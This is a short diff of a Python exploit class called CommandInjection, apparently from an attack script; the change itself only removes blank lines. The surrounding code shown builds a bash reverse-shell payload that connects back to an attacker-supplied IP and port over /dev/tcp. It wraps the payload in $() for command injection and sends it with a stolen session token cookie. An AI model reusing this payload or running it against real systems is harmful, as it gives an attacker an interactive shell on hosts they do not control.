@@ -19,13 +19,11 @@ class CommandInjection:
 		self.key = token["token"]
 		print("[+] Token Received")
 
-
 	def MakeCommand(self):
 		command = f"bash -c \'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1\'"
 		payload = f"$({command})"
 		print("[+] Injecting cmd")
 		self.RunCommand(payload)
-
 
 	def RunCommand(self,cmd,timeout=2):
 		cookie = {"token":self.key}
